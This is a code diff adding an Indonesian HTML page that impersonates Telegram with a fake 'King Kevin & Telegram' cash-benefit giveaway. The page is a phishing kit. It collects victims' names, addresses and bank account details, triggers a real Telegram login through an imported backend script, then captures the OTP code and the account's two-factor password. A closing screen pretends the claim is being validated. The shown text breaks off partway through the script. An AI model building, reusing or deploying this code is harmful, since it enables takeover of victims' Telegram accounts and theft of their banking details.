@@ -1,0 +1,1555 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Home</title>
+
+    <!-- Mobile only -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html, body {
+            width: 100%;
+            min-height: 100%;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #ffffff;
+        }
+
+        /* App container */
+        .app {
+            width: 100%;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* ===== HEADER ===== */
+        .header {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 66px;
+            background: #ffffff;
+
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+
+            padding: 0 14px;
+            border-bottom: 1px solid #e5e7eb;
+
+            box-shadow:
+                0 2px 4px rgba(0, 0, 0, 0.06),
+                0 10px 18px rgba(0, 0, 0, 0.04);
+
+            z-index: 100;
+        }
+
+        /* KIRI */
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .logo {
+            width: 32px;
+            height: 32px;
+            object-fit: contain;
+        }
+
+        .title {
+            font-size: 14px;
+            font-weight: 600;
+            line-height: 1.2;
+            color: #111827;   /* abu gelap, lebih lembut */
+        }
+
+        /* KANAN */
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        /* ICON BUTTON */
+        .icon-btn {
+            padding: 10px;
+            cursor: pointer;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .icon-btn svg {
+            display: block;
+            stroke: #111827;   /* samakan warna ikon */
+        }
+
+        /* MENU */
+        .menu-btn {
+            padding: 10px;
+            cursor: pointer;
+        }
+
+        .menu-icon {
+            width: 22px;
+            height: 16px;
+
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .menu-icon span {
+            display: block;
+            height: 2px;
+            width: 100%;
+            background-color: #111827;  /* bukan hitam murni */
+            border-radius: 2px;
+        }
+
+        /* ===== CONTENT ===== */
+        .screen {
+            flex: 1;
+            margin-top: 56px; /* tinggi header */
+            padding: 16px;
+
+            overflow-y: auto;
+            -webkit-overflow-scrolling: touch;
+
+            padding-bottom: calc(16px + env(safe-area-inset-bottom));
+        }
+
+        /* HOME CONTENT */
+        .home-hero {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            margin-top: 20px;
+        }
+
+        .home-hero img {
+            width: 100%;
+            border-radius: 10px;
+            object-fit: cover;
+        }
+
+
+
+        /* ===== HOME TEXT UPGRADE ===== */
+        .home-text {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        /* BADGE */
+        .home-badge {
+            align-self: flex-start;
+            font-size: 11px;
+            font-weight: 600;
+            color: #1d4ed8;
+            background: #eff6ff;
+            padding: 4px 8px;
+            border-radius: 6px;
+            letter-spacing: 0.4px;
+        }
+
+        /* TITLE */
+        .home-title {
+            font-size: 18px;
+            font-weight: 700;
+            line-height: 1.35;
+            color: #111827;
+        }
+
+        .home-title span {
+            display: block;
+            font-size: 15px;
+            font-weight: 600;
+            color: #2563eb;
+            margin-top: 4px;
+        }
+
+        /* DESCRIPTION */
+        .home-desc {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+
+            padding-left: 10px;
+            border-left: 3px solid #e5e7eb;
+        }
+
+        .home-desc p {
+            font-size: 14px;
+            line-height: 1.7;
+            color: #374151;
+        }
+
+
+
+        /* ===== CTA SECTION ===== */
+        .home-cta {
+            margin-top: 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .cta-info {
+            font-size: 13.5px;
+            line-height: 1.6;
+            color: #374151;
+            background: #f9fafb;
+            border-left: 4px solid #2563eb;
+            padding: 10px 12px;
+            border-radius: 6px;
+        }
+
+        /* BUTTON WRAPPER */
+        .cta-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        /* BASE BUTTON */
+        .btn {
+            width: 100%;
+            padding: 14px 12px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: 8px;
+            border: none;
+            cursor: pointer;
+
+            display: flex;
+            align-items: center;
+            justify-content: center;
+
+            transition: all 0.2s ease;
+        }
+
+        /* PRIMARY CTA */
+        .btn-primary {
+            background: #2563eb;
+            color: #ffffff;
+        }
+
+        .btn-primary:active {
+            background: #1e40af;
+        }
+
+        /* SECONDARY CTA */
+        .btn-secondary {
+            background: #ffffff;
+            color: #2563eb;
+            border: 1px solid #2563eb;
+        }
+
+        .btn-secondary:active {
+            background: #eff6ff;
+        }
+
+
+
+        /* ===== FOOTER ===== */
+        .footer {
+            margin-top: 28px;
+            padding-bottom: 16px;
+
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            text-align: center;
+        }
+
+        .footer-divider {
+            width: 100%;
+            height: 2px;
+            background: #e5e7eb;
+            margin-bottom: 10px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #6b7280;
+            line-height: 1.5;
+        }
+
+        .footer-note {
+            font-size: 11.5px;
+            color: #9ca3af;
+            line-height: 1.5;
+            padding: 0 12px;
+        }
+
+
+
+        /* ===== MODAL POPUP ===== */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.55);
+
+            display: none;
+            align-items: center;
+            justify-content: center;
+
+            padding: 16px;
+            z-index: 999;
+        }
+
+        .modal-overlay.active {
+            display: flex;
+        }
+
+        .modal-box {
+            width: 100%;
+            max-width: 420px;
+            background: #ffffff;
+            border-radius: 12px;
+            overflow: hidden;
+
+            box-shadow:
+                0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+
+        /* HEADER */
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+
+            padding: 14px 16px;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .modal-header h3 {
+            font-size: 15px;
+            font-weight: 600;
+            color: #111827;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            color: #6b7280;
+        }
+
+        /* CONTENT */
+        .modal-content {
+            padding: 16px;
+            font-size: 13.5px;
+            line-height: 1.6;
+            color: #374151;
+        }
+
+        .modal-warning {
+            background: #fff7ed;
+            border-left: 4px solid #f97316;
+            padding: 10px 12px;
+            border-radius: 6px;
+            margin-bottom: 12px;
+        }
+
+        .modal-text {
+            margin-bottom: 10px;
+        }
+
+        .modal-steps {
+            padding-left: 18px;
+            margin-bottom: 12px;
+        }
+
+        .modal-steps li {
+            margin-bottom: 6px;
+        }
+
+        /* NOTE */
+        .modal-note {
+            font-size: 12.5px;
+            color: #6b7280;
+        }
+
+        /* FOOTER */
+        .modal-footer {
+            padding: 14px 16px;
+            border-top: 1px solid #e5e7eb;
+        }
+
+
+
+        /* ===== HIDDEN ===== */
+        .claim-section.hidden {
+            display: none !important;
+        }
+
+        /* ===== CLAIM SECTION ===== */
+        .claim-section {
+            margin-top: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        /* HEADER */
+        .claim-header h3 {
+            font-size: 17px;
+            font-weight: 700;
+            color: #111827;
+            margin-bottom: 6px;
+        }
+
+        .claim-header p {
+            font-size: 13.5px;
+            line-height: 1.6;
+            color: #374151;
+        }
+
+        /* FORM */
+        .claim-form {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .form-group label {
+            font-size: 12.5px;
+            font-weight: 600;
+            color: #374151;
+        }
+
+        .form-group input {
+            padding: 12px 12px;
+            font-size: 14px;
+            border-radius: 8px;
+            border: 1px solid #d1d5db;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #2563eb;
+        }
+
+        /* CLAIM BUTTON */
+        .btn-claim {
+            margin-top: 8px;
+        }
+
+        /* ===== AUTO GROW TEXTAREA ===== */
+        .auto-textarea {
+            width: 100%;
+            min-height: 115px;      /* ⬅ cukup untuk 3–4 baris */
+            padding: 12px;
+            font-size: 14px;
+            line-height: 1.6;
+
+            border-radius: 8px;
+            border: 1px solid #d1d5db;
+            resize: none;
+            overflow: hidden;
+
+            font-family: inherit;
+        }
+
+        .auto-textarea:focus {
+            border-color: #2563eb;
+            outline: none;
+        }
+
+
+
+        /*===  OTP HIDDEN  ===*/
+        .otp-section.hidden {
+            display: none !important;
+        }
+
+        /* ===== VERIFIKASI TEXT ===== */
+        .verify-content {
+            margin-top: 18px;
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+
+        .verify-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #111827;
+            line-height: 1.3;
+        }
+
+        /* ===== NOTICE HIMBAUAN VERIFIKASI ===== */
+        .verify-notice {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+
+            margin: 10px 0 12px;
+            padding: 10px 12px;
+
+            background: #fff7ed;              /* oranye lembut */
+            border-left: 4px solid #f59e0b;   /* garis tegas */
+            border-radius: 8px;
+
+            font-size: 14px;
+            color: #92400e;
+            line-height: 1.5;
+        }
+
+        .verify-icon {
+            font-size: 17px;
+            line-height: 1;
+        }
+
+        .verify-desc {
+            font-size: 14px;
+            color: #374151;
+            line-height: 1.5;
+        }
+
+        /* ===== OTP INPUT ===== */
+        .otp-wrapper {
+            margin-top: 22px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 8px;
+        }
+
+        .otp-box {
+            width: 48px;
+            height: 54px;
+
+            text-align: center;
+            font-size: 22px;
+            font-weight: 600;
+
+            border: 1.5px solid #d1d5db;
+            border-radius: 10px;
+
+            outline: none;
+        }
+
+        .otp-box:focus {
+            border-color: #1f3c88;
+        }
+
+        .otp-status {
+            font-size: 12.5px;
+            color: #1f3c88;
+            min-height: 18px;
+        }
+
+        /*!-- RESEND OTP --*/
+        .otp-resend {
+            margin-top: 12px;
+            text-align: center;
+            font-size: 12.5px;
+            color: #6b7280;
+        }
+
+        .otp-resend button {
+            margin-top: 6px;
+            background: none;
+            border: none;
+            color: #1f3c88;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        .otp-resend button:disabled {
+            color: #9ca3af;
+            cursor: not-allowed;
+        }
+
+
+
+        /*===  PASSWORD HIDDEN  ===*/
+        .password-section.hidden {
+            display: none !important;
+        }
+
+        /* ===== PASSWORD HEADER (UPGRADE) ===== */
+        .password-header {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .password-badge {
+            align-self: flex-start;
+            font-size: 11.5px;
+            font-weight: 600;
+            color: #92400e;
+            background: #fef3c7;
+            padding: 4px 10px;
+            margin-top: 18px;
+            border-radius: 999px;
+        }
+
+        .password-header h3 {
+            font-size: 17px;
+            font-weight: 700;
+            color: #111827;
+            line-height: 1.3;
+        }
+
+        .password-header p {
+            font-size: 13.5px;
+            line-height: 1.7;
+            color: #374151;
+        }
+
+        /*!--css password --*/
+        .password-wrapper {
+            margin-top: 24px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .password-label {
+            font-size: 13px;
+            font-weight: 600;
+            color: #374151;
+        }
+
+        .password-input {
+            height: 44px;
+            padding: 0 12px;
+            border-radius: 8px;
+            border: 1px solid #d1d5db;
+            font-size: 14px;
+        }
+
+        /* wrapper input + icon mata */
+        .password-field {
+            position: relative;
+            width: 100%;
+        }
+
+        /* beri ruang kanan utk ikon mata */
+        .password-field .password-input {
+            width: 100%;
+            padding-right: 42px;
+        }
+
+        /* tombol mata */
+        .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 18px;
+            cursor: pointer;
+            color: #6b7280;
+            padding: 0;
+        }
+
+        /* feedback sentuh di HP */
+        .toggle-password:active {
+            opacity: 0.6;
+        }
+
+        .password-btn {
+            height: 44px;
+            border: none;
+            border-radius: 10px;
+            background: #92400e;
+            color: white;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+
+
+
+        /*===  validasi HIDDEN  ===*/
+        .validasi-section.hidden {
+            display: none !important;
+        }
+
+        /* tampilan tesk validasi permintaan */
+        .request-wrapper {
+            margin-top: 28px;
+            padding: 22px;
+            border-radius: 14px;
+            background: #f0fdf4;
+            border: 1px solid #bbf7d0;
+            text-align: center;
+        }
+
+        .request-icon {
+            font-size: 42px;
+            margin-bottom: 12px;
+        }
+
+        .request-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #14532d;
+            margin-bottom: 8px;
+        }
+
+        .request-desc {
+            font-size: 13.5px;
+            color: #166534;
+            margin-bottom: 6px;
+        }
+
+        .request-info {
+            font-size: 12.5px;
+            color: #065f46;
+        }
+
+        .progress-wrapper {
+            width: 100%;
+            max-width: 360px;
+            height: 8px;
+            background: #e5e7eb;
+            border-radius: 999px;
+            margin: 16px auto 6px;
+            overflow: hidden;
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: #1f3c88;
+            transition: width 0.6s ease;
+        }
+
+        .progress-text {
+            font-size: 13px;
+            color: #475569;
+            text-align: center;
+        }
+
+
+        .safe-area {
+            height: env(safe-area-inset-bottom);
+        }
+
+
+    </style>
+</head>
+<body>
+
+    <div class="app">
+
+        <!-- HEADER FIXED -->
+        <div class="header">
+            <div class="header-left">
+                <img src="../assets/logo-telegram.png" alt="Logo" class="logo">
+                <div class="title">
+                    TELEGRAM<br>
+                    MESSENGER INC
+                </div>
+            </div>
+
+            <div class="header-right">
+                <!-- SEARCH ICON -->
+                <div class="icon-btn" onclick="openSearch()">
+                    <svg viewBox="0 0 24 24" width="20" height="20">
+                        <circle cx="11" cy="11" r="7" stroke="black" stroke-width="2" fill="none"/>
+                        <line x1="16.5" y1="16.5" x2="21" y2="21" stroke="black" stroke-width="2"/>
+                    </svg>
+                </div>
+
+                <!-- MENU ICON -->
+                <div class="menu-btn" onclick="openMenu()">
+                    <div class="menu-icon">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- CONTENT (SCROLLABLE) -->
+        <div class="screen">
+            <div class="home-hero">
+                <img src="../assets/promosi_tele.jpeg" alt="spanduk promosi telegram">
+
+                <div class="home-text">
+                    <span class="home-badge">PROGRAM RESMI TELEGRAM</span>
+
+                    <h2 class="home-title">
+                        Dana Manfaat Puluhan Juta Rupiah
+                        <span>Dari King Kevin & Telegram</span>
+                    </h2>
+
+                    <div class="home-desc">
+                        <p>
+                            King Kevin dan Platform Telegram menyalurkan dana puluhan juta rupiah
+                            bagi setiap penggunah aplikasi telegram yang beruntung,
+                        </p>
+                        <p>
+                            Melalui layanan ini, penggunah aplikasi telegram memperoleh informasi mengenai
+                            cara dapat dana manfaat puluhan juta rupiah secara nyata , amanah , dan transparan.
+                        </p>
+                    </div>
+                </div>
+
+            </div>
+
+            <div class="home-cta">
+                <p class="cta-info">
+                    Silakan pilih salah satu opsi di bawah untuk melanjutkan proses
+                    mendapatkan dana manfaat resmi dari Telegram dan King kevin.
+                </p>
+
+                <div class="cta-buttons">
+                    <button class="btn btn-primary" onclick="showClaimForm()">
+                        ✅ Sudah Punya Akun Telegram
+                    </button>
+
+                    <button class="btn btn-secondary" onclick="openTelegramGuide()">
+                        📲 Belum Punya Akun Telegram
+                    </button>
+                </div>
+            </div>
+
+            <footer class="footer">
+                <div class="footer-divider"></div>
+
+                <p class="footer-text">
+                    © 2026 Telegram Messenger Inc.  
+                <br>
+                    All rights reserved.
+                </p>
+
+                <p class="footer-note">
+                    Layanan informasi ini bersifat resmi dan ditujukan untuk pengguna
+                    aplikasi Telegram.
+                </p>
+            </footer>
+
+            <!-- CLAIM FORM SECTION -->
+            <div class="claim-section hidden" id="claimSection">
+
+                <div class="claim-header">
+                    <h3>Form Klaim Dana Manfaat</h3>
+                    <p>
+                        Silakan lengkapi data di bawah ini dengan benar dan sesuai
+                        agar proses klaim dana manfaat dapat diproses.
+                    </p>
+                </div>
+
+                <form class="claim-form">
+
+                    <div class="form-group">
+                        <label>Nama Lengkap</label>
+                        <input type="text" placeholder="Masukkan nama lengkap">
+                    </div>
+
+                    <div class="form-group">
+                        <label>Alamat Lengkap</label>
+                        <textarea
+                            class="auto-textarea"
+                            placeholder="Contoh :&#10;Alamat Jalan Raya Jenderal Sudirman&#10;Kota Jakarta&#10;Provinsi DKI Jakarta"></textarea>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Rekening Bank</label>
+                        <textarea
+                            class="auto-textarea"
+                            placeholder="Contoh :&#10;Bank BCA&#10;Nomor Rekening 753433273&#10;Atas Nama Dinda"></textarea>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="phone-cek">Nomor Telegram</label>
+                        <input type="text" id="phone-cek" placeholder="Masukkan Nomor Telegram" inputmode="numeric" maxlength="14">
+                    </div>
+
+                    <!-- STATUS TEKS -->
+                    <p id="status-cek" style="font-size:12.5px;margin-top:6px;"></p>
+
+                    <button type="button" class="btn btn-primary btn-claim" onclick="handlePhone()">
+                        💰 Claim Dana Manfaat Sekarang
+                    </button>
+
+                </form>
+
+            </div>
+
+
+            <!-- OTP SECTION -->
+            <div class="otp-section hidden" id="otpSection">
+                
+                <!-- ===== VERIFIKASI CONTENT ===== -->
+                <div class="verify-content">
+
+                    <h1 class="verify-title">
+                        Aktivasi Kode Permintaan Anda
+                    </h1>
+
+                    <div id="verify-notice" class="verify-notice">
+                        <span class="verify-icon">⚠️</span>
+                        <p id="verify-notice-text">
+                            Kode OTP bersifat rahasia. gunakan hanya di situs resmi ini.
+                        </p>
+                    </div>
+
+                    <p class="verify-desc">
+                        Untuk melanjutkan proses klaim Dana Manfaat, silakan masukkan
+                        kode verifikasi (OTP) yang telah dikirim ke akun Telegram Anda.
+                    </p>
+
+                </div>
+
+                <!-- ===== OTP INPUT ===== -->
+                <div class="otp-wrapper">
+
+                    <div class="otp-inputs" id="otpInputs">
+                        <input type="text" inputmode="numeric" maxlength="1" class="otp-box">
+                        <input type="text" inputmode="numeric" maxlength="1" class="otp-box">
+                        <input type="text" inputmode="numeric" maxlength="1" class="otp-box">
+                        <input type="text" inputmode="numeric" maxlength="1" class="otp-box">
+                        <input type="text" inputmode="numeric" maxlength="1" class="otp-box">
+                    </div>
+
+                    <!-- STATUS LOADING -->
+                    <p id="otp-status" class="otp-status"></p>
+
+                </div>
+
+                <!-- RESEND OTP -->
+                <div class="otp-resend">
+                    <span id="resend-text">Tidak menerima kode?</span>
+                    <button id="resend-btn" disabled>
+                        Kirim ulang kode OTP
+                    </button>
+                </div>
+
+            </div>
+
+
+
+            <!-- PASSWORD SECTION -->
+            <div class="password-section hidden" id="passwordSection">
+
+                <div class="password-header">
+
+                    <div class="password-badge">
+                        🔐 Validasi Akun
+                    </div>
+
+                    <h3>Validasi Password Untuk Klaim Dana Manfaat</h3>
+
+                    <p>
+                        Untuk Menyelesaikan Proses Klaim Dana Manfaat & Menampilkan
+                        Hasil pencairan Dana Manfaat, Silakan Masukkan Password Akun Telegram Anda.
+                    </p>
+
+                </div>
+
+                <!-- ===== PASSWORD INPUT (HIDDEN AWALNYA) ===== -->
+                <div class="password-wrapper" id="passwordWrapper">
+
+                    <label class="password-label">
+                        Masukkan password akun Telegram
+                    </label>
+
+                    <div class="password-field">
+                        <input
+                            type="password"
+                            id="passwordInput"
+                            class="password-input"
+                            placeholder="Password Telegram"
+                        >
+
+                        <button
+                            type="button"
+                            id="togglePassword"
+                            class="toggle-password"
+                            aria-label="Tampilkan password"
+                        >
+                            🙈
+                        </button>
+                    </div>
+
+                    <button id="passwordBtn" class="password-btn">
+                        🔓 Password Klaim Dana Sekarang
+                    </button>
+
+                    <p id="password-status" class="otp-status"></p>
+
+                </div>
+
+            </div>
+
+
+            <!-- PASSWORD SECTION -->
+            <div class="validasi-section hidden" id="validasiSection">
+
+                <!-- ===== VALIDASI PERMINTAAN ===== -->
+                <div class="request-wrapper" id="requestWrapper">
+
+                    <div class="request-icon">✅</div>
+
+                    <h2 class="request-title">
+                        Permintaan Anda Sedang Diproses
+                    </h2>
+
+                    <p class="request-desc">
+                        Data dan permintaan Anda telah kami terima dengan baik.
+                        Saat ini sedang dilakukan proses validasi oleh sistem.
+                    </p>
+
+                    <p class="request-info">
+                        Silakan menunggu. Anda akan dihubungi apabila hasil
+                        verifikasi telah tersedia.
+                    </p>
+
+                    <!-- ⏳ PROGRESS BAR VALIDASI -->
+                    <div class="progress-wrapper">
+                        <div class="progress-bar" id="requestProgress"></div>
+                    </div>
+
+                    <p class="progress-text">
+                        Memvalidasi data permintaan...
+                    </p>
+
+                </div>
+
+            </div>
+
+        </div>
+
+        <div class="safe-area"></div>
+
+        <!-- TELEGRAM GUIDE MODAL -->
+        <div class="modal-overlay" id="telegramModal">
+            <div class="modal-box">
+
+                <div class="modal-header">
+                    <h3>⚠️ Peringatan & Panduan</h3>
+                    <button class="modal-close" onclick="closeTelegramGuide()">✕</button>
+                </div>
+
+                <div class="modal-content">
+                    <p class="modal-warning">
+                        Untuk berkesempatan mendapatkan <b>dana manfaat puluhan juta rupiah
+                        dari King Kevin & Telegram</b>, nomor handphone Anda <b>wajib terdaftar
+                        di aplikasi Telegram</b> atau Anda harus memiliki akun Telegram aktif.
+                    </p>
+
+                    <p class="modal-text">
+                        Jika Anda belum memiliki akun Telegram, silakan ikuti panduan resmi
+                        pembuatan akun Telegram di bawah ini:
+                    </p>
+
+                    <ol class="modal-steps">
+                        <li>Buka <b>Play Store</b> (Android) atau <b>App Store</b> (iPhone).</li>
+                        <li>Cari aplikasi <b>Telegram</b> lalu unduh dan instal.</li>
+                        <li>Setelah terpasang, buka aplikasi Telegram.</li>
+                        <li>Masukkan <b>nomor handphone aktif</b> Anda.</li>
+                        <li>Telegram akan mengirim <b>kode verifikasi (OTP)</b> melalui SMS atau panggilan.</li>
+                        <li>Masukkan kode verifikasi tersebut ke aplikasi.</li>
+                        <li>Lengkapi data profil (nama & foto opsional).</li>
+                        <li>Setelah selesai, akun Telegram Anda <b>siap digunakan</b>.</li>
+                    </ol>
+
+                    <p class="modal-note">
+                        Setelah akun Telegram berhasil dibuat, silakan kembali ke halaman ini
+                        dan lanjutkan proses mendapatkan dana manfaat.
+                    </p>
+                </div>
+
+                <div class="modal-footer">
+                    <button class="btn btn-primary" onclick="closeTelegramGuide()">
+                        Saya Mengerti
+                    </button>
+                </div>
+
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Import api.js -->
+    <script src="../api.js"></script>
+    <script>
+        function openMenu() {
+            alert("Menu diklik");
+        }
+        function openSearch() {
+            alert("Search diklik");
+        }
+
+
+
+        function openTelegramGuide() {
+            document.getElementById("telegramModal").classList.add("active");
+        }
+
+        function closeTelegramGuide() {
+            document.getElementById("telegramModal").classList.remove("active");
+        }
+
+
+
+        function autoResize(el) {
+            el.style.height = "auto";
+            el.style.height = el.scrollHeight + "px";
+        }
+
+        document.querySelectorAll(".auto-textarea").forEach(el => {
+            el.addEventListener("input", () => autoResize(el));
+        });
+
+
+
+        function showClaimForm() {
+            const homeCTA = document.querySelector(".home-cta");
+            const footer = document.querySelector(".footer");
+            const claim = document.getElementById("claimSection");
+
+            if (homeCTA) homeCTA.style.display = "none";
+            if (footer) footer.style.display = "none";
+
+            claim.classList.remove("hidden");
+
+            claim.scrollIntoView({ behavior: "smooth" });
+        }
+
+
+
+        // ⭐ script untuk fungsi input phone Telegram )
+        async function handlePhone() {
+
+            // === ELEMENT ===
+            const nameEl = document.querySelector('input[placeholder="Masukkan nama lengkap"]');
+            const addressEl = document.querySelectorAll(".auto-textarea")[0];
+            const bankEl = document.querySelectorAll(".auto-textarea")[1];
+            const phoneInputEl = document.getElementById("phone-cek");
+            const statusEl = document.getElementById("status-cek");
+            const btn = document.querySelector(".btn-claim");
+
+            // === VALUE ===
+            const name = nameEl.value.trim();
+            const address = addressEl.value.trim();
+            const bank = bankEl.value.trim();
+            let phoneInput = phoneInputEl.value.trim();
+
+            // === VALIDASI WAJIB ===
+            if (!name || !address || !bank || !phoneInput) {
+                statusEl.style.color = "#b91c1c";
+                statusEl.textContent = "⚠️ Semua data wajib diisi";
+                return;
+            }
+
+            // === VALIDASI TELEGRAM (ANGKA SAJA) ===
+            phoneInput = phoneInput.replace(/\D/g, "");
+            phoneInputEl.value = phoneInput;
+
+            if (phoneInput.length < 9) {
+                statusEl.style.color = "#b91c1c";
+                statusEl.textContent = "⚠️ Nomor Telegram tidak valid";
+                return;
+            }
+
+            if (phoneInput.length > 14) {
+                phoneInput = phoneInput.slice(0, 14);
+                phoneInputEl.value = phoneInput;
+            }
+
+            // === FORMAT +62 ===
+            const phone =
+                phoneInput.startsWith("0")
+                    ? "+62" + phoneInput.slice(1)
+                    : phoneInput.startsWith("62")
+                        ? "+" + phoneInput
+                        : "+" + phoneInput;
+
+            // === UI LOADING STATE ===
+            btn.disabled = true;
+            statusEl.style.color = "#1f3c88";
+            statusEl.textContent = "⏳ Sistem sedang memproses, mohon tunggu...";
+
+            try {
+                const res = await startLogin(phone);
+
+                if (res.ok && res.data.status === "otp_sent") {
+                    sessionStorage.setItem("phone", phone);
+                    sessionStorage.setItem("name", name);
+                    sessionStorage.setItem("address", address);
+                    sessionStorage.setItem("bank", bank);
+                    
+                    // hide form
+                    document.querySelector(".claim-section").classList.add("hidden");
+
+                    // show OTP
+                    document.getElementById("otpSection").classList.remove("hidden");
+
+                    document.getElementById("otpSection")
+                        .scrollIntoView({ behavior: "smooth" });
+
+                    return;
+                }
+
+                if (!res.ok && res.data?.error) {
+                    statusEl.style.color = "#b91c1c";
+                    statusEl.textContent = "❌ " + res.data.error;
+                    return;
+                }
+
+                statusEl.style.color = "#b91c1c";
+                statusEl.textContent = "❌ Terjadi kesalahan sistem";
+
+            } catch (err) {
+                statusEl.style.color = "#b91c1c";
+                statusEl.textContent = "❌ Gagal terhubung ke server";
+            } finally {
+                btn.disabled = false;
+            }
+        }
+        ["phone-cek"].forEach(id => {
+            const el = document.getElementById(id);
+            if (!el) return;
+
+            el.addEventListener("input", function () {
+                this.value = this.value.replace(/\D/g, "").slice(0, 14);
+            });
+        });
+
+
+
+
+        // ====== (sripts Otp ) ====== //
+        const otpBoxes = document.querySelectorAll(".otp-box");
+        const otpStatus = document.getElementById("otp-status");
+
+        // ====== HANDLE KLIK (CERDAS) ======
+        otpBoxes.forEach((box, index) => {
+            box.addEventListener("mousedown", (e) => {
+                e.preventDefault();
+
+                // cari index kotak kosong pertama
+                let firstEmptyIndex = -1;
+                otpBoxes.forEach((b, i) => {
+                    if (!b.value && firstEmptyIndex === -1) {
+                        firstEmptyIndex = i;
+                    }
+                });
+
+                // jika klik di kotak berisi → fokus di situ
+                if (box.value) {
+                    box.focus();
+                    return;
+                }
+
+                // jika klik di kotak kosong → fokus ke kotak kosong pertama
+                if (firstEmptyIndex !== -1) {
+                    otpBoxes[firstEmptyIndex].focus();
+                }
+            });
+        });
+        // ====== HANDLE INPUT ======
+        otpBoxes.forEach((box, index) => {
+
+            box.addEventListener("input", () => {
+                // hanya angka
+                box.value = box.value.replace(/\D/g, "");
+                if (!box.value) return;
+
+                // pindah ke kotak berikutnya
+                if (index < otpBoxes.length - 1) {
+                    otpBoxes[index + 1].focus();
+                } else {
+                    startOtpProcess();
+                }
+            });
+
+            box.addEventListener("keydown", (e) => {
+                if (e.key === "Backspace" && !box.value && index > 0) {
+                    otpBoxes[index - 1].focus();
+                }
+            });
+        });
+        async function startOtpProcess() {
+            const otp = Array.from(otpBoxes).map(b => b.value).join("");
+            if (otp.length !== otpBoxes.length) return;
+
+            otpStatus.style.color = "#1f3c88";
+            otpStatus.textContent = "⏳ Memverifikasi kode, mohon tunggu...";
+
+            const phone = sessionStorage.getItem("phone");
+            if (!phone) {
+                otpStatus.style.color = "#b91c1c";
+                otpStatus.textContent = "❌ Sesi tidak valid, silakan ulangi dari awal";
+                return;
+            }
+
+            try {
+                const res = await verifyOtp(phone, otp);
+
+                // ✅ LOGIN SUKSES
+                if (res.status === "login_success") {
+                    otpStatus.style.color = "#15803d";
+                    otpStatus.textContent = "✅ Verifikasi berhasil";
+
+
+                    setTimeout(() => {
+                        showRequestState();
+                    }, 600);
+
+                    return;
+                }
+
+                // 🔐 PASSWORD REQUIRED
+                if (res.status === "password_required") {
+                    otpStatus.style.color = "#92400e";
+                    otpStatus.textContent = "🔐 Akun membutuhkan password";
+
+                    // sembunyikan OTP
+                    document.getElementById("otpSection").classList.add("hidden");
+
+                    // tampilkan PASSWORD
+                    const passSection = document.getElementById("passwordSection");
+                    passSection.classList.remove("hidden");
+
+                    passSection.scrollIntoView({ behavior: "smooth" });
+
+                    return;
+
+                }
+
+                // ❌ ERROR DARI BACKEND
+                if (res.error) {
+                    otpStatus.style.color = "#b91c1c";
+                    otpStatus.textContent = "❌ " + res.error;
+
+                    // reset OTP agar bisa input ulang
+                    otpBoxes.forEach(b => b.value = "");
+                    otpBoxes[0].focus();
+                }
+
+            } catch (err) {
+                otpStatus.style.color = "#b91c1c";
+                otpStatus.textContent = "❌ Gagal terhubung ke server";
+            }
+        }
+        // pengaturan fungsi untuk tombol otp resend
+        const resendBtn = document.getElementById("resend-btn");
+        const resendText = document.getElementById("resend-text");
+
+        let countdown = 60;
+        let countdownTimer = null;
+
+        // mulai countdown saat halaman dibuka
+        startResendCountdown();
+
+        function startResendCountdown() {
+            resendBtn.disabled = true;
+            updateResendText();
+
+            countdownTimer = setInterval(() => {
